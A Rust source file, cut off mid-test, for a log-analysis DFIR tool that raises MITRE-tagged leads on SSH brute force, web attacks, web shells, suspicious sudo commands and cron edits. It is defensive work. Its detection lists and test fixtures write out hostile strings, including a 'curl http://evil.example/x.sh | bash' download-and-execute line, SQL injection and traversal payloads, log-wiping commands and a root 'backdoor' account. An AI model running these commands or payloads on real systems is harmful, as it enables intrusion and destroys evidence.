//! DFIR stage 2 — heuristic detections («подсказки») over the parsed timeline.
//!
//! Each detector reads the normalized [`LogEvent`]s and raises a [`Finding`]
//! only from facts already on the timeline. Every finding carries the exact
//! log lines it rests on ([`EvidenceRef`]), a UTC time range and the relevant
//! MITRE ATT&CK technique id — so the analyst can confirm it against the
//! source, and nothing is asserted without a concrete line. The analyst
//! decides; these are leads, not verdicts.

use std::collections::BTreeMap;

use serde::{Deserialize, Serialize};

use crate::{LogEvent, LogSource, Outcome};

/// How serious a lead is. Serializes lowercase to match the rest of the UI.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

/// A pointer to one log line that supports a finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvidenceRef {
    pub timestamp: String,
    pub source_file: String,
    pub line_no: usize,
    pub summary: String,
    pub raw: String,
}

impl EvidenceRef {
    pub(crate) fn of(e: &LogEvent) -> Self {
        Self {
            timestamp: e.timestamp.clone(),
            source_file: e.source_file.clone(),
            line_no: e.line_no,
            summary: e.summary.clone(),
            raw: e.raw.clone(),
        }
    }
}

/// One detection lead.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    /// Rule id, e.g. `ssh-bruteforce-success`.
    pub rule: String,
    pub title: String,
    pub severity: Severity,
    /// MITRE ATT&CK technique ids, e.g. `T1110`.
    pub mitre: Vec<String>,
    pub summary: String,
    /// Who/what the lead is about (an IP, a user), when there is one.
    pub actor: Option<String>,
    pub first_time: String,
    pub last_time: String,
    /// The log lines this rests on (bounded).
    pub evidence: Vec<EvidenceRef>,
    /// For cross-host links (stage 3): the hosts this indicator spans. Empty
    /// for ordinary single-host findings.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub hosts: Vec<String>,
}

/// Evidence lines kept per finding, at most.
const MAX_EVIDENCE: usize = 12;
/// Failed SSH logins from one IP before it counts as brute force.
const SSH_FAIL_THRESHOLD: usize = 5;
/// Distinct 404 paths from one IP before it counts as path scanning.
const SCAN_404_THRESHOLD: usize = 15;

/// Run every detector over the timeline and return the leads, worst first.
pub fn detect(events: &[LogEvent]) -> Vec<Finding> {
    let mut out = Vec::new();
    out.extend(ssh_bruteforce(events));
    out.extend(web_attacks(events));
    out.extend(web_webshell(events));
    out.extend(path_scanning(events));
    out.extend(account_creation(events));
    out.extend(suspicious_commands(events));
    out.extend(cron_persistence(events));

    // Worst severity first, then earliest.
    out.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.first_time.cmp(&b.first_time))
    });
    out
}

// ---------------------------------------------------------------------------
// SSH brute force (optionally leading to a successful login)
// ---------------------------------------------------------------------------

fn ssh_bruteforce(events: &[LogEvent]) -> Vec<Finding> {
    struct PerIp<'a> {
        failures: Vec<&'a LogEvent>,
        first_success: Option<&'a LogEvent>,
    }
    let mut by_ip: BTreeMap<String, PerIp> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::Auth {
            continue;
        }
        let Some(ip) = e.fields.get("src_ip") else {
            continue;
        };
        if ip.is_empty() {
            continue;
        }
        let entry = by_ip.entry(ip.clone()).or_insert_with(|| PerIp {
            failures: Vec::new(),
            first_success: None,
        });
        match e.outcome {
            Some(Outcome::Failure) => entry.failures.push(e),
            Some(Outcome::Success) if entry.first_success.is_none() => {
                entry.first_success = Some(e);
            }
            _ => {}
        }
    }

    let mut findings = Vec::new();
    for (ip, per) in by_ip {
        if per.failures.len() < SSH_FAIL_THRESHOLD {
            continue;
        }
        let n = per.failures.len();
        // Evidence: the first few and the last few failures.
        let mut evidence: Vec<EvidenceRef> = Vec::new();
        for e in per.failures.iter().take(MAX_EVIDENCE / 2) {
            evidence.push(EvidenceRef::of(e));
        }
        if n > MAX_EVIDENCE / 2 {
            for e in per.failures.iter().skip(n.saturating_sub(MAX_EVIDENCE / 2)) {
                evidence.push(EvidenceRef::of(e));
            }
        }
        let first_fail = per.failures.first().unwrap();
        let last_fail = per.failures.last().unwrap();

        if let Some(success) = per.first_success {
            // A success from the same IP after a burst of failures — treat the
            // success as the likely moment of compromise.
            if success.timestamp >= first_fail.timestamp {
                evidence.push(EvidenceRef::of(success));
                let user = success.fields.get("user").cloned().unwrap_or_default();
                findings.push(Finding {
                    rule: "ssh-bruteforce-success".into(),
                    title: "Подбор пароля SSH с последующим успешным входом".into(),
                    severity: Severity::Critical,
                    mitre: vec!["T1110".into(), "T1078".into()],
                    summary: format!(
                        "С адреса {ip} — {n} неудачных попыток входа по SSH, затем успешный вход{}. Вероятный момент компрометации.",
                        if user.is_empty() { String::new() } else { format!(" под пользователем {user}") }
                    ),
                    actor: Some(ip.clone()),
                    first_time: first_fail.timestamp.clone(),
                    last_time: success.timestamp.clone(),
                    evidence,
                    hosts: Vec::new(),
                });
                continue;
            }
        }
        findings.push(Finding {
            rule: "ssh-bruteforce".into(),
            title: "Подбор пароля SSH".into(),
            severity: Severity::High,
            mitre: vec!["T1110".into()],
            summary: format!("С адреса {ip} — {n} неудачных попыток входа по SSH, успешного входа не зафиксировано."),
            actor: Some(ip.clone()),
            first_time: first_fail.timestamp.clone(),
            last_time: last_fail.timestamp.clone(),
            evidence,
            hosts: Vec::new(),
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Web attacks in access logs
// ---------------------------------------------------------------------------

/// A class of web attack and the lowercase substrings that signal it in a
/// request path/query. Kept deliberately specific to limit false positives.
struct WebSig {
    rule: &'static str,
    title: &'static str,
    mitre: &'static str,
    needles: &'static [&'static str],
}

const WEB_SIGS: &[WebSig] = &[
    WebSig {
        rule: "web-sqli",
        title: "Попытка SQL-инъекции",
        mitre: "T1190",
        needles: &[
            "union select",
            "union all select",
            "' or '1'='1",
            "or 1=1",
            "information_schema",
            "sleep(",
            "benchmark(",
            "' or 1=1",
            "\" or \"1\"=\"1",
            "/**/",
            "concat(",
        ],
    },
    WebSig {
        rule: "web-path-traversal",
        title: "Обход каталога (path traversal)",
        mitre: "T1083",
        needles: &[
            "../../",
            "..%2f",
            "%2e%2e%2f",
            "%2e%2e/",
            "..\\",
            "/etc/passwd",
            "..%5c",
        ],
    },
    WebSig {
        rule: "web-rfi-lfi",
        title: "Подключение файла (LFI/RFI)",
        mitre: "T1190",
        needles: &[
            "php://",
            "file://",
            "data://",
            "expect://",
            "=http://",
            "=https://",
        ],
    },
    WebSig {
        rule: "web-ssti",
        title: "Подстановка в шаблон (SSTI)",
        mitre: "T1190",
        needles: &["{{", "${", "<%=", "#{", "{%"],
    },
    WebSig {
        rule: "web-cmd-injection",
        title: "Внедрение команды ОС",
        mitre: "T1190",
        needles: &[
            ";id", "|id", "$(", "`id`", ";cat ", "%3bcat", "wget ", "curl ", ";whoami", "|whoami",
        ],
    },
];

/// Known web-shell file names. A request to one of these that the server
/// *answers* (2xx) is the signal of a live shell — see [`web_webshell`].
const WEBSHELL_NAMES: &[&str] = &[
    "c99.php",
    "c100.php",
    "r57.php",
    "wso.php",
    "b374k",
    "shell.php",
    "cmd.php",
    "backdoor.php",
    "alfa.php",
    "webshell",
];

/// Decode `%XX` escapes and `+` in a request target, so an encoded payload is
/// matched the same as a literal one. One pass, lossy UTF-8; unknown escapes
/// are left as-is.
fn percent_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 2 < bytes.len() => {
                let hi = (bytes[i + 1] as char).to_digit(16);
                let lo = (bytes[i + 2] as char).to_digit(16);
                if let (Some(h), Some(l)) = (hi, lo) {
                    out.push((h * 16 + l) as u8);
                    i += 3;
                } else {
                    out.push(b'%');
                    i += 1;
                }
            }
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            c => {
                out.push(c);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn web_attacks(events: &[LogEvent]) -> Vec<Finding> {
    // Group matches by (signature, client ip) so a scan is one finding.
    struct Group<'a> {
        hits: Vec<&'a LogEvent>,
    }
    let mut groups: BTreeMap<(&'static str, String), Group> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::WebAccess {
            continue;
        }
        let path = e.fields.get("path").map(|s| s.as_str()).unwrap_or("");
        if path.is_empty() {
            continue;
        }
        // Attack payloads in a request are URL-encoded (a raw space would
        // break the log line), so decode before matching.
        let hay = percent_decode(path).to_ascii_lowercase();
        let ip = e.actor.clone().unwrap_or_default();
        for sig in WEB_SIGS {
            if sig.needles.iter().any(|n| hay.contains(n)) {
                groups
                    .entry((sig.rule, ip.clone()))
                    .or_insert_with(|| Group { hits: Vec::new() })
                    .hits
                    .push(e);
            }
        }
    }

    let mut findings = Vec::new();
    for ((rule, ip), group) in groups {
        let sig = WEB_SIGS.iter().find(|s| s.rule == rule).unwrap();
        let n = group.hits.len();
        let first = group.hits.first().unwrap();
        let last = group.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = group
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        findings.push(Finding {
            rule: rule.into(),
            title: sig.title.into(),
            severity: Severity::High,
            mitre: vec![sig.mitre.into()],
            summary: format!(
                "С адреса {} — {n} запрос(ов) с признаками «{}».",
                if ip.is_empty() {
                    "?".into()
                } else {
                    ip.clone()
                },
                sig.title
            ),
            actor: if ip.is_empty() { None } else { Some(ip) },
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts: Vec::new(),
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Web shell access (a known shell file the server actually answered)
// ---------------------------------------------------------------------------

/// A finding here means a web shell responded — a known shell file name that
/// the server answered with a 2xx. A 404 to the same name is just someone
/// *looking* for a shell, which `path_scanning` already covers; raising a High
/// "shell" on that (or on a bare `cmd=`/`eval` substring) is a false positive
/// the real-capture test exposed. So this is deliberately gated on a 2xx.
fn web_webshell(events: &[LogEvent]) -> Vec<Finding> {
    struct Group<'a> {
        hits: Vec<&'a LogEvent>,
    }
    let mut groups: BTreeMap<String, Group> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::WebAccess {
            continue;
        }
        let path = e.fields.get("path").map(|s| s.as_str()).unwrap_or("");
        if path.is_empty() {
            continue;
        }
        // The shell has to have answered, not 404'd on a recon probe.
        let status = e.fields.get("status").map(|s| s.as_str()).unwrap_or("");
        if !status.starts_with('2') {
            continue;
        }
        let hay = percent_decode(path).to_ascii_lowercase();
        if !WEBSHELL_NAMES.iter().any(|n| hay.contains(n)) {
            continue;
        }
        let ip = e.actor.clone().unwrap_or_default();
        groups
            .entry(ip)
            .or_insert_with(|| Group { hits: Vec::new() })
            .hits
            .push(e);
    }

    let mut findings = Vec::new();
    for (ip, group) in groups {
        let n = group.hits.len();
        let first = group.hits.first().unwrap();
        let last = group.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = group
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        findings.push(Finding {
            rule: "web-webshell".into(),
            title: "Обращение к веб-шеллу".into(),
            severity: Severity::High,
            mitre: vec!["T1505.003".into()],
            summary: format!(
                "С адреса {} — {n} успешных обращений (2xx) к известному веб-шеллу.",
                if ip.is_empty() {
                    "?".into()
                } else {
                    ip.clone()
                }
            ),
            actor: if ip.is_empty() { None } else { Some(ip) },
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts: Vec::new(),
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Path scanning / enumeration (many distinct 404s from one IP)
// ---------------------------------------------------------------------------

fn path_scanning(events: &[LogEvent]) -> Vec<Finding> {
    struct PerIp<'a> {
        paths: std::collections::BTreeSet<String>,
        hits: Vec<&'a LogEvent>,
    }
    let mut by_ip: BTreeMap<String, PerIp> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::WebAccess {
            continue;
        }
        let status = e.fields.get("status").map(|s| s.as_str()).unwrap_or("");
        if status != "404" {
            continue;
        }
        let ip = e.actor.clone().unwrap_or_default();
        if ip.is_empty() {
            continue;
        }
        let path = e.fields.get("path").cloned().unwrap_or_default();
        let entry = by_ip.entry(ip).or_insert_with(|| PerIp {
            paths: std::collections::BTreeSet::new(),
            hits: Vec::new(),
        });
        entry.paths.insert(path);
        entry.hits.push(e);
    }

    let mut findings = Vec::new();
    for (ip, per) in by_ip {
        if per.paths.len() < SCAN_404_THRESHOLD {
            continue;
        }
        let distinct = per.paths.len();
        let first = per.hits.first().unwrap();
        let last = per.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = per
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        findings.push(Finding {
            rule: "web-path-scan".into(),
            title: "Сканирование/перебор путей".into(),
            severity: Severity::Medium,
            mitre: vec!["T1595".into()],
            summary: format!("С адреса {ip} — {distinct} различных несуществующих путей (404). Похоже на автоматический перебор."),
            actor: Some(ip),
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts: Vec::new(),
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Local account creation
// ---------------------------------------------------------------------------

fn account_creation(events: &[LogEvent]) -> Vec<Finding> {
    let mut findings = Vec::new();
    for e in events {
        if e.source != LogSource::Auth && e.source != LogSource::Syslog {
            continue;
        }
        let hay = e.raw.to_ascii_lowercase();
        let is_new_user =
            hay.contains("new user:") || hay.contains("useradd[") || hay.contains("useradd:");
        if !is_new_user {
            continue;
        }
        findings.push(Finding {
            rule: "account-created".into(),
            title: "Создана учётная запись".into(),
            severity: Severity::Medium,
            mitre: vec!["T1136".into()],
            summary: format!("Создание новой учётной записи: {}", e.summary),
            actor: useradd_name(&e.raw),
            first_time: e.timestamp.clone(),
            last_time: e.timestamp.clone(),
            evidence: vec![EvidenceRef::of(e)],
            hosts: Vec::new(),
        });
    }
    findings
}

/// The account name from a `useradd`/`new user:` line (`name=<value>`), so the
/// finding can point at who was created.
fn useradd_name(raw: &str) -> Option<String> {
    let rest = &raw[raw.find("name=")? + 5..];
    let end = rest
        .find(|c: char| c == ',' || c.is_whitespace())
        .unwrap_or(rest.len());
    let v = rest[..end].trim();
    (!v.is_empty()).then(|| v.to_string())
}

// ---------------------------------------------------------------------------
// Persistence via cron (a crontab was installed or changed)
// ---------------------------------------------------------------------------

/// The user whose crontab a `crontab[…]: (user) REPLACE` line changed.
fn crontab_user(raw: &str) -> Option<String> {
    let rest = raw.split('(').nth(1)?;
    let user = rest.split(')').next()?.trim();
    (!user.is_empty() && !user.contains(' ')).then(|| user.to_string())
}

/// Installing or editing a crontab (`crontab[PID]: (user) REPLACE …`) is a
/// common way to keep a foothold. A lead, not a verdict — admins edit crons
/// too — so Medium; grouped per user.
fn cron_persistence(events: &[LogEvent]) -> Vec<Finding> {
    struct Group<'a> {
        hits: Vec<&'a LogEvent>,
    }
    let mut groups: BTreeMap<String, Group> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::Auth && e.source != LogSource::Syslog {
            continue;
        }
        let hay = e.raw.to_ascii_lowercase();
        // A crontab edit: the `crontab` tool logging a REPLACE (install/change).
        if !(hay.contains("crontab[") && hay.contains("replace")) {
            continue;
        }
        let user = crontab_user(&e.raw).unwrap_or_default();
        groups
            .entry(user)
            .or_insert_with(|| Group { hits: Vec::new() })
            .hits
            .push(e);
    }

    let mut findings = Vec::new();
    for (user, group) in groups {
        let n = group.hits.len();
        let first = group.hits.first().unwrap();
        let last = group.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = group
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        let who = if user.is_empty() {
            String::new()
        } else {
            format!(" (пользователь {user})")
        };
        findings.push(Finding {
            rule: "cron-modified".into(),
            title: "Изменение планировщика cron".into(),
            severity: Severity::Medium,
            mitre: vec!["T1053.003".into()],
            summary: format!(
                "Установлен или изменён crontab{who} ({n} раз). Частый способ закрепления — проверьте задание.",
            ),
            actor: (!user.is_empty()).then_some(user),
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts: Vec::new(),
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Suspicious privileged commands (sudo COMMAND=…)
// ---------------------------------------------------------------------------

/// A class of dangerous command and the lowercase substrings that signal it in
/// the command a `sudo` line recorded. Checked in order, so the first (most
/// serious) matching class wins for a given command.
struct CmdSig {
    rule: &'static str,
    title: &'static str,
    severity: Severity,
    mitre: &'static [&'static str],
    needles: &'static [&'static str],
}

const CMD_SIGS: &[CmdSig] = &[
    CmdSig {
        rule: "cmd-log-clearing",
        title: "Очистка журналов (антифорензика)",
        severity: Severity::Critical,
        mitre: &["T1070.002", "T1070"],
        needles: &[
            "rm -rf /var/log",
            "rm -r /var/log",
            "rm -f /var/log",
            "rm /var/log",
            "> /var/log",
            "truncate",
            "journalctl --vacuum",
            "journalctl --rotate",
            "shred",
            "wtmp",
            "btmp",
            "lastlog",
            "history -c",
        ],
    },
    CmdSig {
        rule: "cmd-disable-defense",
        title: "Отключение средств защиты",
        severity: Severity::High,
        mitre: &["T1562.001"],
        needles: &[
            "systemctl stop auditd",
            "systemctl disable auditd",
            "service auditd stop",
            "auditctl -e 0",
            "systemctl stop firewalld",
            "systemctl stop ufw",
            "ufw disable",
            "systemctl stop fail2ban",
            "systemctl stop apparmor",
            "setenforce 0",
            "iptables -f",
            "iptables --flush",
        ],
    },
    CmdSig {
        rule: "cmd-download-exec",
        title: "Загрузка и запуск постороннего кода",
        severity: Severity::High,
        mitre: &["T1059.004", "T1105"],
        needles: &[
            "|sh",
            "| sh",
            "|bash",
            "| bash",
            "sh -c",
            "bash -c",
            "base64 -d",
            "/dev/tcp/",
            "python -c",
            "python3 -c",
            "perl -e",
            "curl http",
            "wget http",
        ],
    },
    CmdSig {
        rule: "cmd-offensive-tool",
        title: "Хакерский инструмент",
        severity: Severity::Medium,
        mitre: &["T1059"],
        needles: &[
            " nc ", "ncat", "netcat", "nmap", "masscan", "socat", "hydra", "hashcat", "chisel",
        ],
    },
];

/// Classify one recorded command into its most serious matching class.
fn classify_command(cmd_lower: &str) -> Option<&'static CmdSig> {
    CMD_SIGS
        .iter()
        .find(|sig| sig.needles.iter().any(|n| cmd_lower.contains(n)))
}

/// The user a `sudo` line attributes the command to (`sudo:   deploy : TTY…`),
/// preferring a parsed field when present.
fn sudo_user(e: &LogEvent) -> Option<String> {
    if let Some(u) = e.fields.get("user").filter(|s| !s.is_empty()) {
        return Some(u.clone());
    }
    let rest = e.raw.split("sudo:").nth(1)?;
    let user = rest.split(" : ").next()?.trim();
    (!user.is_empty() && !user.contains(' ')).then(|| user.to_string())
}

fn suspicious_commands(events: &[LogEvent]) -> Vec<Finding> {
    // Group by (class, user) so repeated runs of one kind are one lead.
    struct Group<'a> {
        hits: Vec<&'a LogEvent>,
    }
    let mut groups: BTreeMap<(&'static str, String), Group> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::Auth && e.source != LogSource::Syslog {
            continue;
        }
        // Only sudo lines that actually ran a command.
        let Some(cmd_start) = e.raw.find("COMMAND=") else {
            continue;
        };
        if !e.raw.contains("sudo") {
            continue;
        }
        let cmd = e.raw[cmd_start + "COMMAND=".len()..].to_ascii_lowercase();
        let Some(sig) = classify_command(&cmd) else {
            continue;
        };
        let user = sudo_user(e).unwrap_or_default();
        groups
            .entry((sig.rule, user))
            .or_insert_with(|| Group { hits: Vec::new() })
            .hits
            .push(e);
    }

    let mut findings = Vec::new();
    for ((rule, user), group) in groups {
        let sig = CMD_SIGS.iter().find(|s| s.rule == rule).unwrap();
        let n = group.hits.len();
        let first = group.hits.first().unwrap();
        let last = group.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = group
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        let who = if user.is_empty() {
            String::new()
        } else {
            format!(" (пользователь {user})")
        };
        findings.push(Finding {
            rule: rule.into(),
            title: sig.title.into(),
            severity: sig.severity,
            mitre: sig.mitre.iter().map(|m| (*m).into()).collect(),
            summary: format!(
                "Через sudo выполнено {n} команд(ы) с признаком «{}»{who}.",
                sig.title
            ),
            actor: (!user.is_empty()).then_some(user),
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts: Vec::new(),
        });
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{analyze_path, Options};
    use std::io::Write;

    struct TempDir(std::path::PathBuf);
    impl TempDir {
        fn new(tag: &str) -> Self {
            let mut p = std::env::temp_dir();
            p.push(format!(
                "incident-det-{tag}-{}-{:?}",
                std::process::id(),
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_nanos()
            ));
            std::fs::create_dir_all(&p).unwrap();
            TempDir(p)
        }
        fn write(&self, name: &str, body: &str) {
            let mut f = std::fs::File::create(self.0.join(name)).unwrap();
            f.write_all(body.as_bytes()).unwrap();
        }
    }
    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }
    fn opts() -> Options {
        Options {
            assume_year: Some(2026),
            ..Options::default()
        }
    }
    fn find<'a>(f: &'a [Finding], rule: &str) -> &'a Finding {
        f.iter()
            .find(|x| x.rule == rule)
            .unwrap_or_else(|| panic!("no finding {rule} in {f:#?}"))
    }

    #[test]
    fn bruteforce_then_success_is_critical_with_the_success_line() {
        let d = TempDir::new("bf");
        let mut body = String::new();
        for i in 0..6 {
            body.push_str(&format!(
                "Oct 10 13:55:{:02} web01 sshd[2200]: Failed password for invalid user admin from 192.0.2.50 port 5000{} ssh2\n",
                30 + i, i
            ));
        }
        body.push_str("Oct 10 13:56:10 web01 sshd[2211]: Accepted password for deploy from 192.0.2.50 port 50422 ssh2\n");
        d.write("auth.log", &body);

        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "ssh-bruteforce-success");
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.actor.as_deref(), Some("192.0.2.50"));
        assert!(f.mitre.iter().any(|m| m == "T1110"));
        // The success line is in the evidence.
        assert!(f
            .evidence
            .iter()
            .any(|e| e.raw.contains("Accepted password for deploy")));
    }

    #[test]
    fn failures_without_success_are_high_not_critical() {
        let d = TempDir::new("bfonly");
        let mut body = String::new();
        for i in 0..6 {
            body.push_str(&format!(
                "Oct 10 13:55:{:02} web01 sshd[2200]: Failed password for root from 198.51.100.7 port 600{} ssh2\n",
                30 + i, i
            ));
        }
        d.write("auth.log", &body);
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "ssh-bruteforce");
        assert_eq!(f.severity, Severity::High);
        assert!(t
            .findings
            .iter()
            .all(|x| x.rule != "ssh-bruteforce-success"));
    }

    #[test]
    fn four_failures_do_not_trigger() {
        let d = TempDir::new("few");
        let mut body = String::new();
        for i in 0..4 {
            body.push_str(&format!(
                "Oct 10 13:55:{:02} web01 sshd[2200]: Failed password for root from 203.0.113.1 port 600{} ssh2\n",
                30 + i, i
            ));
        }
        d.write("auth.log", &body);
        let t = analyze_path(&d.0, &opts()).unwrap();
        assert!(t
            .findings
            .iter()
            .all(|x| !x.rule.starts_with("ssh-bruteforce")));
    }

    #[test]
    fn sqli_and_traversal_in_access_log_are_flagged() {
        let d = TempDir::new("web");
        d.write(
            "access.log",
            "192.0.2.9 - - [10/Oct/2026:14:00:00 +0000] \"GET /p?id=1'%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1\" 200 10 \"-\" \"x\"\n\
             192.0.2.9 - - [10/Oct/2026:14:00:01 +0000] \"GET /../../etc/passwd HTTP/1.1\" 404 10 \"-\" \"x\"\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let sqli = find(&t.findings, "web-sqli");
        assert_eq!(sqli.severity, Severity::High);
        assert_eq!(sqli.actor.as_deref(), Some("192.0.2.9"));
        let trav = find(&t.findings, "web-path-traversal");
        assert!(trav.evidence.iter().any(|e| e.raw.contains("/etc/passwd")));
    }

    #[test]
    fn a_live_webshell_2xx_is_flagged_but_a_404_probe_is_not() {
        let d = TempDir::new("shell");
        d.write(
            "access.log",
            // A recon probe for a shell → 404: not a webshell finding.
            "203.0.113.5 - - [10/Oct/2026:14:00:00 +0000] \"GET /shell.php HTTP/1.1\" 404 10 \"-\" \"x\"\n\
             203.0.113.5 - - [10/Oct/2026:14:00:05 +0000] \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 42 \"-\" \"x\"\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "web-webshell");
        assert_eq!(f.severity, Severity::High);
        assert_eq!(f.actor.as_deref(), Some("203.0.113.5"));
        // Exactly the 2xx hit is evidence, not the 404 probe.
        assert!(f.evidence.iter().all(|e| e.raw.contains("200")));
    }

    #[test]
    fn a_cmd_param_without_a_shell_name_is_not_a_webshell() {
        // The real-capture false positive: a cmd= param on a 404, and an
        // eval-stdin recon probe, must not raise web-webshell.
        let d = TempDir::new("noshell");
        d.write(
            "access.log",
            "203.0.113.6 - - [10/Oct/2026:14:00:00 +0000] \"GET /run?cmd=%3Bcat%20%2Fetc%2Fpasswd HTTP/1.1\" 404 10 \"-\" \"x\"\n\
             203.0.113.6 - - [10/Oct/2026:14:00:01 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 404 10 \"-\" \"x\"\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        assert!(
            t.findings.iter().all(|f| f.rule != "web-webshell"),
            "{:#?}",
            t.findings
        );
    }

    #[test]
    fn a_benign_request_raises_nothing() {
        let d = TempDir::new("benign");
        d.write(
            "access.log",
            "192.0.2.9 - - [10/Oct/2026:14:00:00 +0000] \"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla\"\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        assert!(t.findings.is_empty(), "{:#?}", t.findings);
    }

    #[test]
    fn new_account_is_detected() {
        let d = TempDir::new("acct");
        d.write(
            "auth.log",
            "Oct 10 14:05:00 web01 useradd[3001]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "account-created");
        assert!(f.mitre.iter().any(|m| m == "T1136"));
        assert!(f.evidence[0].raw.contains("backdoor"));
        // The created account's name is surfaced as the actor.
        assert_eq!(f.actor.as_deref(), Some("backdoor"));
    }

    #[test]
    fn sudo_log_clearing_is_critical() {
        let d = TempDir::new("logclear");
        d.write(
            "auth.log",
            "Oct 10 15:00:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=1s\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "cmd-log-clearing");
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.actor.as_deref(), Some("deploy"));
        assert!(f.mitre.iter().any(|m| m == "T1070.002"));
    }

    #[test]
    fn sudo_download_and_execute_is_flagged() {
        let d = TempDir::new("dlexec");
        d.write(
            "auth.log",
            "Oct 10 15:01:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c curl http://evil.example/x.sh | bash\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "cmd-download-exec");
        assert_eq!(f.severity, Severity::High);
        assert!(f.mitre.iter().any(|m| m == "T1059.004"));
    }

    #[test]
    fn sudo_offensive_tool_is_flagged() {
        let d = TempDir::new("tool");
        d.write(
            "auth.log",
            "Oct 10 15:02:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/apt-get install netcat\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "cmd-offensive-tool");
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn sudo_disabling_defenses_is_flagged() {
        let d = TempDir::new("defoff");
        d.write(
            "auth.log",
            "Oct 10 15:10:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop auditd\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "cmd-disable-defense");
        assert_eq!(f.severity, Severity::High);
        assert!(f.mitre.iter().any(|m| m == "T1562.001"));
    }

    #[test]
    fn a_crontab_replace_is_flagged_as_persistence() {
        let d = TempDir::new("cron");
        d.write(
            "syslog",
            "Oct 10 15:20:00 web01 crontab[4120]: (deploy) REPLACE (deploy)\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "cron-modified");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.actor.as_deref(), Some("deploy"));
        assert!(f.mitre.iter().any(|m| m == "T1053.003"));
    }

    #[test]
    fn a_crontab_list_is_not_persistence() {
        // Only REPLACE (an edit/install) is a lead; listing a crontab is not.
        let d = TempDir::new("cronlist");
        d.write(
            "syslog",
            "Oct 10 15:21:00 web01 crontab[4130]: (deploy) LIST (deploy)\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        assert!(t.findings.iter().all(|f| f.rule != "cron-modified"));
    }

    #[test]
    fn a_normal_sudo_command_raises_nothing() {
        let d = TempDir::new("sudok");
        d.write(
            "auth.log",
